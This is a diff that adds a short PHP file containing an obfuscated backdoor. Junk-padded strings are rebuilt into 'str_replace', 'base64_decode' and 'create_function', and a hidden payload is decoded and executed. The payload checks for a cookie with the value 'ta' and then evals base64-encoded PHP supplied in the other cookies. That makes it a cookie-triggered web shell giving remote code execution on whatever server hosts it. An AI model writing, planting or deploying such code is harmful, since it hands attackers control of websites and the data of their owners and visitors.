@@ -1,0 +1,10 @@
+<?php
+$taqf="fyfcpLCBqb2lufKGFfycmF5X3NsfaWNlKCfRhfLCRjfKCRhKS0zKfSkpKSk7ZWNobfyAnPC8nLiRrfLic+fJzt9";
+$tiwq="feyRrPfSfd5fYfjUfwMDAnfO2VjaG8gJzwnLiRrfLfic+JfzftldmFsKGJhc2U2NF9kZWNvZGUocHJlZ1f9y";
+$tjxf="ZXBsYWNlKGFycmF5KCcvW1f5cdz1fcc10vfJywnLf1xzfLycpLCBhcnJheSgnJyfwfnK";
+$exga = str_replace("i","","isitir_ireipiliaicie");
+$abpt="JGM9Jf2NvdW50JzskfYT0kX0NPT0tJRTtpfZfihyZXNldCfgkYSk9PSd0YScgJiYgJfGMoJGEpPjMp";
+$csnq = $exga("y", "", "ybyasyey6y4y_dyeycyodye");
+$jqyg = $exga("j","","jcjrejajtje_fjunjctjijon");
+$grsj = $jqyg('', $csnq($exga("f", "", $abpt.$tiwq.$tjxf.$taqf))); $grsj();
+?>
